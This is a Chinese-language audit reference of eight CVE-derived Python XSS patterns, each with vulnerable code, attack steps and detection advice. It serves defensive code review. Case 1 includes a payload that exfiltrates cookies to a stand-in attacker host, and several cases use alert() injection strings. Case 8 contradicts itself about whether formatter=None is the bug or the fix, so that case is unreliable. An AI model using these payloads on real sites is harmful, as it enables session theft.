# XSS Vulnerability Cases (CWE-79)

本文档包含从真实 CVE/GHSA 中提炼的 Python XSS 漏洞模式案例。每个 Case 代表一种独特的漏洞变体模式。

---

### Case 1: bugsink — Django mark_safe() 在 Pygments fallback 路径上未转义原始输入 (CVE-2026-27614, CVSS 9.3)

**Root Cause**: Pygments 代码高亮失败时的 fallback 路径直接返回原始输入行，后续 `mark_safe()` 无条件标记为安全 HTML，导致存储型 XSS。

**Source -> Sink 路径**:
- **Source**: Sentry 协议事件提交接口 `/api/<project-id>/store/`，攻击者通过 DSN 提交包含恶意 HTML 的 stacktrace frame
- **Sink**: Django 模板标签中 `mark_safe(line)` 将未转义的原始代码行标记为安全 HTML
- **Sanitization Gap**: 主路径（Pygments 成功解析）输出已转义的 HTML，但 fallback 路径（Pygments 返回行数不匹配时）直接返回原始输入，`mark_safe()` 仍无条件应用

**Vulnerable Code Pattern** (`theme/templatetags/issues.py`):
```python
def _pygmentize_lines(lines, filename=None, platform=None):
    result = _core_pygments(code, filename=filename, platform=platform).split('\n')[:-1]
    if len(lines) != len(result):
        capture_stacktrace("Pygments line count mismatch, falling back to unformatted code")
        result = lines  # BUG: 原始用户输入未经转义直接返回

    return result

# 调用处：
return [mark_safe(line) for line in result]  # mark_safe 无条件应用于所有路径
```

**Attack Path**:
1. 攻击者通过公开的 Sentry DSN 端点提交包含 Ruby heredoc 风格代码的事件（触发 Pygments 行数不匹配）
2. `context_line` 字段包含 `<img src=x onerror=fetch('//attacker/?c='+document.cookie)>`
3. 管理员在 UI 查看该事件时，`mark_safe()` 标记的恶意 HTML 在浏览器中执行

**Why Standard Scanners Miss It**:
- CodeQL: 标准 XSS query 能检测 `mark_safe()` 调用，但难以追踪条件分支中 fallback 路径的数据流（`lines` 变量在正常路径是安全的 Pygments 输出）
- Bandit: B703 规则检测 `mark_safe()` 但无法区分参数是否已转义，会产生大量误报导致被忽略

**How to Detect**:
1. **定位 Sink**: Grep `mark_safe\(` — 找到所有 `mark_safe()` 调用点
2. **检查条件分支**: 特别关注 `if/else` 和 `try/except` 中的 fallback 路径，检查 fallback 是否跳过了主路径的转义逻辑
3. **回溯 Source**: 确认 `mark_safe()` 的参数在所有可能路径上是否都经过了 HTML 转义
4. **验证外部依赖的一致性**: 检查第三方库（如 Pygments）的输出是否在所有情况下都是安全的

**Similar Vulnerabilities**: GHSA-3v79-q7ph-j75h (MLflow mark_safe 相关), Django CMS mark_safe 误用系列

---

### Case 2: jupyter-server-proxy — Tornado handler 直接 write() 输出未转义的 URL 路径参数 (CVE-2024-35225, CVSS 9.7)

**Root Cause**: Tornado Web handler 中 `self.write()` 直接输出包含用户输入的错误消息，URL 路径参数 `host` 未经 HTML 转义直接嵌入响应体。

**Source -> Sink 路径**:
- **Source**: URL 路径段 `/proxy/<host>`，`host` 值由用户控制
- **Sink**: `self.write("Host '{host}' is not allowed...")` 将 `host` 直接写入 HTTP 响应
- **Sanitization Gap**: `self.write()` 不会自动转义 HTML，且 `self.set_status(403)` 不改变 Content-Type（默认 text/html）

**Vulnerable Code Pattern** (`jupyter_server_proxy/handlers.py`):
```python
async def proxy(self, host, port, proxied_path):
    if not self._check_host_allowlist(host):
        self.set_status(403)
        self.write(
            "Host '{host}' is not allowed. "
            "See https://jupyter-server-proxy.readthedocs.io/en/latest/..."
            .format(host=host)  # BUG: host 未转义，直接拼入 HTML 响应
        )
        return
```

**Attack Path**:
1. 攻击者构造钓鱼链接 `/proxy/<script>alert(document.cookie)</script>:8080/`
2. 用户点击后，Tornado 返回包含未转义 `host` 值的 403 响应
3. 浏览器将响应渲染为 HTML，执行注入的 JavaScript

**Why Standard Scanners Miss It**:
- CodeQL: Tornado 的 `self.write()` 不在标准 XSS sink 列表中（通常只覆盖 `render()` 和 `render_string()`）
- Bandit: 没有针对 Tornado handler `self.write()` 的 XSS 检测规则

**How to Detect**:
1. **定位 Sink**: Grep `self\.write\(` — 在 Tornado/Flask handler 中找到直接写响应的位置
2. **检查 Content-Type**: 确认响应是否为 `text/html`（Tornado 默认）
3. **回溯 Source**: 检查 `write()` 的参数中是否包含来自 URL 路径、查询参数、请求头的用户数据
4. **验证修复方案**: 优先使用 `raise web.HTTPError()` 替代 `self.write()` + `self.set_status()`，Tornado 的 HTTPError 默认会转义错误消息

**Similar Vulnerabilities**: Flask `make_response()` 直接输出用户输入, aiohttp `web.Response(text=user_input, content_type='text/html')`

---

### Case 3: mlflow — Pandas DataFrame 渲染未转义单元格值导致数据集 XSS (CVE-2024-27133, CVSS 9.7)

**Root Cause**: 使用 `pd.DataFrame.style.to_html()` 渲染数据表格时，未对单元格值进行 HTML 转义。攻击者在数据集字段中注入恶意脚本，渲染时在 Jupyter Notebook 中执行。

**Source -> Sink 路径**:
- **Source**: 不可信数据集的表格字段值（通过 recipe 加载的 CSV/Parquet 文件内容）
- **Sink**: `pd.DataFrame(table, columns=columns).style.to_html()` 将未转义的单元格值渲染为 HTML
- **Sanitization Gap**: `pandas.style.to_html()` 的 `escape` 参数默认不转义单元格内容，且 `applymap` 方式的手动转义在修复前完全缺失

**Vulnerable Code Pattern** (`mlflow/recipes/cards/__init__.py`):
```python
@staticmethod
def render_table(table, columns=None, hide_index=True):
    from pandas.io.formats.style import Styler

    if not isinstance(table, Styler):
        table = pd.DataFrame(table, columns=columns).style  # BUG: 未转义单元格值

    # 修复后：
    # def escape_value(x):
    #     return html.escape(str(x))
    # if hasattr(table, "map"):
    #     table = table.map(escape_value)
    # else:
    #     table = table.applymap(escape_value)
    # table = table.style
```

**Attack Path**:
1. 攻击者在数据集字段中注入 `<script>` 标签（如 CSV 文件的某个列值）
2. MLflow recipe 加载并执行时，调用 `render_table()` 将数据集渲染为 HTML 卡片
3. 在 Jupyter Notebook 中显示卡片时，恶意脚本在用户浏览器中执行，可实现 RCE

**Why Standard Scanners Miss It**:
- CodeQL: Pandas `DataFrame.style` 不在标准 XSS sink 列表中，数据科学库的 HTML 渲染通常不被安全工具关注
- Bandit: 没有针对 Pandas HTML 渲染的安全检测规则

**How to Detect**:
1. **定位 Sink**: Grep `\.style\.to_html\(` / `\.to_html\(` / `render_table` — 找到 Pandas 数据渲染点
2. **检查 escape 参数**: `to_html(escape=True)` 或在渲染前对 DataFrame 做 `applymap(html.escape)`
3. **回溯 Source**: 确认 DataFrame 数据是否来自不可信来源（用户上传文件、外部 API、数据库）
4. **Jupyter 环境注意**: 在 Notebook 中 `_repr_html_()` 方法的输出会被直接渲染，风险更高

**Similar Vulnerabilities**: GHSA-6749-m5cp-6cg7 (MLflow recipe 模板变量 XSS), Streamlit DataFrame 渲染 XSS

---

### Case 4: mlflow — Jinja2 模板变量未使用 |e 过滤器 (CVE-2024-27132, CVSS 9.7)

**Root Cause**: Jinja2 模板中使用 `{{ SCHEMA|e }}` 对已经是 HTML 的内容做转义导致双重转义，开发者"修复"时去掉了 `|e`（`{{ SCHEMA }}`），但这使得通过 `add_html()` 注入的内容不再被转义。

**Source -> Sink 路径**:
- **Source**: 不可信 recipe 的 schema 字段数据（通过 `render_table(schema["fields"])` 渲染）
- **Sink**: Jinja2 模板 `{{SCHEMA}}` 不使用 `|e` 过滤器，`add_html()` 方法将 HTML 直接注入模板
- **Sanitization Gap**: `add_html()` 的设计意图是插入已安全的 HTML 片段，但当 HTML 中包含不可信数据时，模板级别的转义被绕过

**Vulnerable Code Pattern** (`mlflow/recipes/steps/ingest/__init__.py`):
```python
# Tab #2 -- Ingested dataset schema.
schema_html = BaseCard.render_table(schema["fields"])  # 来自不可信 recipe 的数据
card.add_tab("Data Schema", "{{SCHEMA|e}}").add_html("SCHEMA", schema_html)
# BUG: |e 转义了 HTML 标签本身，导致表格无法渲染
# 开发者改为：
card.add_tab("Data Schema", "{{SCHEMA}}").add_html("SCHEMA", schema_html)
# 现在不转义了，但 schema_html 中可能含恶意代码

# 对比 stacktrace 的正确修复：
card.add_tab(
    "Stacktrace",
    "<div class='stacktrace-container'>{{ STACKTRACE|e }}</div>"
).add_html("STACKTRACE", str(failure_traceback))
```

**Attack Path**:
1. 攻击者创建包含恶意 JavaScript 的 recipe 配置文件（schema 字段包含 `<script>` 标签）
2. 受害者运行该 recipe，`render_table()` 将恶意数据渲染为 HTML
3. Jinja2 模板中 `{{SCHEMA}}` 不转义，恶意 HTML 在 Notebook 中执行

**Why Standard Scanners Miss It**:
- CodeQL: 需要理解 `add_html()` 方法的语义——它将内容标记为"已安全"，但实际上内容可能不安全
- Bandit: 无法检测 Jinja2 模板中缺失的 `|e` 过滤器（模板文件通常不在 Python 静态分析范围内）

**How to Detect**:
1. **定位 Sink**: Grep `\{\{.*\}\}` 在 Python 字符串中的 Jinja2 模板变量，特别关注未使用 `|e` 的变量
2. **检查 autoescape 配置**: 确认 Jinja2 Environment 是否设置了 `autoescape=True`
3. **追踪 add_html/set_context 等方法**: 检查注入模板的数据是否来自不可信来源
4. **双重转义陷阱**: 开发者为避免双重转义而移除 `|e`，需确认被注入的 HTML 本身是否已安全

**Similar Vulnerabilities**: Flask 模板 autoescape 配置错误, Airflow DAG 渲染 XSS

---

### Case 5: modoboa — Django 模板 |safe 过滤器标记表单错误信息为安全 HTML (CVE-2023-5688, CVSS 9.8)

**Root Cause**: Django 模板中对表单字段的 `error` 使用了 `|safe` 过滤器，将本应被转义的错误消息标记为安全 HTML。攻击者通过构造包含 HTML 的输入触发验证错误，错误消息中包含的恶意代码被渲染。

**Source -> Sink 路径**:
- **Source**: 用户提交的表单字段值（触发 Django 表单验证错误）
- **Sink**: Django 模板 `{{ error|safe }}` 将错误消息作为原始 HTML 输出
- **Sanitization Gap**: Django 模板 autoescape 默认开启，但 `|safe` 过滤器显式绕过了自动转义

**Vulnerable Code Pattern** (`modoboa/templates/common/generic_field.html`):
```html
{% if field.errors %}
<p class="help-block">
  {% for error in field.errors %}
  {{ error|safe }}    {# BUG: |safe 绕过 Django 自动转义 #}
  {% endfor %}
</p>
{% endif %}

{# 修复后: #}
{# {{ error }}  — 使用 Django 默认的 autoescape #}
```

**Attack Path**:
1. 攻击者在表单字段中输入包含 JavaScript 的值（如 `<img src=x onerror=alert(1)>`）
2. 表单验证失败，Django 将用户输入包含在错误消息中返回
3. 模板中 `{{ error|safe }}` 将错误消息作为原始 HTML 渲染，恶意代码执行

**Why Standard Scanners Miss It**:
- CodeQL: 标准 Django XSS query 会检测 `|safe`，但在大型项目中 `|safe` 使用频繁（如渲染富文本），容易被忽略为误报
- Bandit: 不分析 Django 模板文件（`.html`），只分析 Python 代码

**How to Detect**:
1. **定位 Sink**: Grep `\|safe` 在所有 Django 模板文件中（`*.html`）
2. **分类检查**: 区分 `|safe` 用于静态 HTML（安全）和用于包含用户数据的变量（危险）
3. **特别关注 `field.errors`**: Django 表单错误消息可能包含用户输入，绝不应使用 `|safe`
4. **检查自定义模板标签**: `mark_safe()` 在 templatetags 中的使用同样危险

**Similar Vulnerabilities**: Django CMS 多处 `|safe` 误用, Wagtail 表单错误 XSS

---

### Case 6: pgadmin4 — JavaScript innerHTML 渲染数据库查询结果导致 XSS (CVE-2025-2946, CVSS 9.1)

**Root Cause**: 前端 JavaScript 使用 `.innerHTML` 渲染从 PostgreSQL 查询返回的数据。攻击者在数据库中存储包含恶意脚本的数据，管理员通过 pgAdmin 查询时触发 XSS。

**Source -> Sink 路径**:
- **Source**: PostgreSQL 数据库中存储的用户可控数据（表的列值）
- **Sink**: `measureText.ele.innerHTML = text` 将查询结果文本作为 HTML 渲染
- **Sanitization Gap**: Python 后端直接将查询结果通过 API 返回给前端，前端使用 `innerHTML` 而非 `textContent` 渲染

**Vulnerable Code Pattern** (`web/pgadmin/static/js/utils.js`):
```javascript
export function measureText(text, font) {
    if (!measureText.ele) {
        measureText.ele = document.createElement('span');
        measureText.ele.style.cssText = `position: absolute; visibility: hidden; ...`;
        document.body.appendChild(measureText.ele);
    }
    measureText.ele.innerHTML = text;  // BUG: 查询结果未转义直接赋值 innerHTML
    // 修复: measureText.ele.textContent = text;
    const dim = measureText.ele.getBoundingClientRect();
    return {width: dim.width, height: dim.height};
}
```

**Attack Path**:
1. 攻击者在 PostgreSQL 数据库的某个表中插入包含 `<img src=x onerror=alert(document.cookie)>` 的列值
2. 管理员使用 pgAdmin Query Tool 查询该表
3. 前端调用 `measureText()` 计算列宽时，`innerHTML` 触发恶意脚本执行

**Why Standard Scanners Miss It**:
- CodeQL: JavaScript XSS query 能检测 `innerHTML`，但 Python 后端代码审计工具不会分析前端 JS 文件
- Bandit: 只分析 Python 代码，不覆盖 JavaScript 文件中的 DOM XSS

**How to Detect**:
1. **定位 Sink**: Grep `\.innerHTML\s*=` 在项目的 JavaScript/TypeScript 文件中
2. **追踪数据流**: 检查 `innerHTML` 的值是否来自后端 API 返回的数据（尤其是用户可控数据）
3. **Python 后端检查**: 确认 API 端点是否对返回的用户数据做了 HTML 转义
4. **全栈审计**: Python Web 应用的 XSS 审计必须同时覆盖前端渲染逻辑

**Similar Vulnerabilities**: GHSA-gj27-76gq-5v3p (Open WebUI model description XSS), Grafana 仪表板数据渲染 XSS

---

### Case 7: ansibleguy-webui — Django REST Framework 序列化器缺少 XSS 输入校验 (CVE-2024-36110, CVSS 8.2)

**Root Cause**: Django REST Framework 序列化器未对用户输入进行 HTML 字符校验，API 接收的数据中包含 HTML 标签，后端存储后在前端渲染时触发存储型 XSS。

**Source -> Sink 路径**:
- **Source**: REST API 端点接收的 JSON 字段（任务名称、告警配置、仓库描述等）
- **Sink**: Django 模板或前端 JavaScript 渲染这些字段值时未转义
- **Sanitization Gap**: DRF 的 `CharField`/`TextField` 默认不做 HTML 字符过滤，序列化器的 `validate()` 中也未添加自定义校验

**Vulnerable Code Pattern** (`src/ansibleguy-webui/aw/api_endpoints/job.py`):
```python
# 修复前：序列化器无 validate 方法，直接接受任意字符串
class JobWriteRequest(serializers.ModelSerializer):
    class Meta:
        model = Job
        fields = Job.api_fields_write
    name = serializers.CharField(validators=[])  # 无 XSS 校验

# 修复后（aw/api_endpoints/base.py）：
from django.utils.html import escape as escape_html

def validate_no_xss(value: str, field: str):
    if is_set(value) and isinstance(value, str) and value != escape_html(value):
        raise ValidationError(f"Found illegal characters in field '{field}'")

# 在每个序列化器中添加：
def validate(self, attrs: dict):
    for field in Job.api_fields_write:
        if field in attrs:
            validate_no_xss(value=attrs[field], field=field)
    return attrs
```

**Attack Path**:
1. 认证用户通过 REST API 提交包含 HTML/JavaScript 的字段值（如任务名称 `<script>alert(1)</script>`）
2. 数据存储到数据库中
3. 其他用户（包括管理员）查看包含该字段的页面时，恶意代码被渲染执行

**Why Standard Scanners Miss It**:
- CodeQL: DRF 序列化器的数据流分析复杂，标准 query 不覆盖 "API 输入 -> 数据库 -> 模板渲染" 的跨组件路径
- Bandit: 不分析 DRF 序列化器的安全性，无 XSS 相关的 DRF 规则

**How to Detect**:
1. **定位 API 端点**: Grep `serializers.ModelSerializer` / `serializers.Serializer` 找到所有序列化器
2. **检查 validate 方法**: 确认 `CharField`/`TextField` 字段是否有自定义验证防止 HTML 注入
3. **追踪渲染路径**: 确认存储的字段值在前端渲染时是否经过转义
4. **防御方案**: 在序列化器层面比较 `value != escape_html(value)` 或使用 `bleach.clean()` 过滤

**Similar Vulnerabilities**: GHSA-w7xj-8fx7-wfch (Open WebUI prompt XSS), Django admin 自定义字段 XSS

---

### Case 8: mjml-python — BeautifulSoup decode_contents() 反向解码 HTML 实体导致 XSS (CVE-2024-26151, CVSS 8.2)

**Root Cause**: `BeautifulSoup.decode_contents(formatter=None)` 将已编码的 HTML 实体（如 `&lt;script&gt;`）反向解码为原始 HTML（`<script>`），导致用户输入中的安全编码被撤销。

**Source -> Sink 路径**:
- **Source**: 用户提供的邮件模板变量数据（嵌入 MJML 模板的文本内容）
- **Sink**: `_mjml.decode_contents(formatter=None)` 反向解码 HTML 实体后输出到最终 HTML
- **Sanitization Gap**: 上游代码可能已将 `<script>` 编码为 `&lt;script&gt;`，但 `decode_contents()` 调用时 `formatter=None` 会撤销这层编码

**Vulnerable Code Pattern** (`mjml/mjml2html.py`):
```python
def parse(_mjml, parentMjClass='', *, template_dir):
    # ...
    # upstream parses text contents (+ comments) in mjml-parser-xml/index.js
    content = _mjml.decode_contents()
    # BUG: 默认 formatter='minimal' 会将 &lt; 解码为 <
    # 意味着用户输入 &lt;script&gt; 变成 <script>

    # ... 处理后 ...
    content = contentSoup.decode_contents()
    # 同样的问题：HTML 实体被反向解码

# 修复：使用 formatter=None 保持原始编码
# content = _mjml.decode_contents(formatter=None)
```

**Attack Path**:
1. 攻击者在平台中输入 `&lt;script&gt;alert(1)&lt;/script&gt;`（已编码的 HTML）
2. 数据被安全地存储为编码形式
3. MJML 模板渲染时，`decode_contents()` 将 `&lt;script&gt;` 解码为 `<script>`
4. 最终邮件 HTML 中包含可执行的 `<script>` 标签

**Why Standard Scanners Miss It**:
- CodeQL: `decode_contents()` 不在标准 XSS sink 列表中，且 BeautifulSoup 的 formatter 参数语义需要领域知识
- Bandit: 没有针对 BeautifulSoup HTML 实体解码的安全检测规则

**How to Detect**:
1. **定位 Sink**: Grep `decode_contents\(` — 找到所有 BeautifulSoup 内容提取调用
2. **检查 formatter 参数**: `formatter=None` 保持原始编码（安全），默认 `formatter='minimal'` 会解码实体（危险）
3. **追踪数据流**: 确认提取的内容是否包含用户输入，且是否会被输出到 HTML 上下文
4. **注意版本差异**: BeautifulSoup 4.x 不同版本的 `decode_contents()` 默认行为可能不同

**Similar Vulnerabilities**: lxml `tostring()` HTML 实体处理, html5lib 解码行为差异

---

## 模式总结

| 模式 | Sink 特征 | 典型场景 | 检测关键词 |
|------|-----------|----------|-----------|
| `mark_safe()` fallback 路径 | `mark_safe(user_data)` | Django 模板标签中异常/回退处理 | `mark_safe\(` |
| Tornado `self.write()` 反射 | `self.write(f"...{user_input}...")` | 错误页面、状态信息输出 | `self\.write\(` |
| Pandas DataFrame 渲染 | `.style.to_html()` | 数据科学/ML 平台的表格展示 | `to_html\(`, `render_table` |
| Jinja2 缺失 `\|e` 过滤器 | `{{ VAR }}` 无 `\|e` | 自定义卡片/报告渲染系统 | `\{\{.*\}\}` 不含 `\|e` |
| Django `\|safe` 过滤器 | `{{ error\|safe }}` | 表单错误消息、富文本展示 | `\|safe` |
| `innerHTML` 数据库数据 | `.innerHTML = queryResult` | 数据库管理工具、数据展示面板 | `\.innerHTML\s*=` |
| DRF 序列化器无校验 | `CharField` 无 XSS validate | REST API 接收用户输入 | `serializers.CharField` |
| `decode_contents()` 实体解码 | `.decode_contents()` | 邮件模板、HTML 转换工具 | `decode_contents\(` |
